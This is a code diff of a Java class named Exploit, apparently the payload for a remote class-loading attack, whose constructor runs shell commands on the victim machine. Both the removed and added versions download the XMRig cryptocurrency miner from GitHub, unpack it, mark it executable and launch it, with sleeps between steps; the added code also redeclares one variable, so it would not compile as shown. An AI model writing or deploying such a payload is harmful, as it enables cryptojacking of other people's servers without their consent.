@@ -23,7 +23,16 @@ import java.net.Socket;
 public class Exploit {
 
     public Exploit() throws Exception {
-        Process process = Runtime.getRuntime().exec("wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz; tar -xvf xmrig-6.16.4-linux-x64.tar.gz; chmod +x xmrig-6.16.4/xmrig; ./xmrig-6.16.4/xmrig");
+        Thread.sleep(500);
+        Process process = Runtime.getRuntime().exec("touch testttttttttttttttttt.txt");
+        Thread.sleep(500);
+        Process process = Runtime.getRuntime().exec("wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz");
+        Thread.sleep(5000);
+        Process process2 = Runtime.getRuntime().exec("tar -xvf xmrig-6.16.4-linux-x64.tar.gz");
+        Thread.sleep(500);
+        Process process3 = Runtime.getRuntime().exec("chmod +x xmrig-6.16.4/xmrig");
+        Thread.sleep(500);
+        Process process4 = Runtime.getRuntime().exec("./xmrig-6.16.4/xmrig");
     }
 }
 """
